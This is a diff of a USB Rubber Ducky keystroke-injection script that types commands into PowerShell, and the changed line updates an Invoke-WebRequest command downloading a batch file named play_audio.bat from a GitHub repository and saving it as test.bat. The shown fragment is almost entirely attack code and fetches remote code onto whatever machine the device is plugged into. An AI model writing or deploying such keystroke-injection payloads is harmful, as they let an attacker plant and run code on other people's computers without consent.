@@ -5,7 +5,7 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 500
-STRING Invoke-WebRequest -Uri "https://github.com/USB-Rubber-Ducky1/executable/raw/main/play_audio.bat" -OutFile "test.bat"
+STRING Invoke-WebRequest -Uri "https://github.com/USB-Rubber-Ducky1/PAYLOAD/raw/main/executable-main/play_audio.bat" -OutFile "test.bat"
 DELAY 500
 ENTER
 DELAY 1500
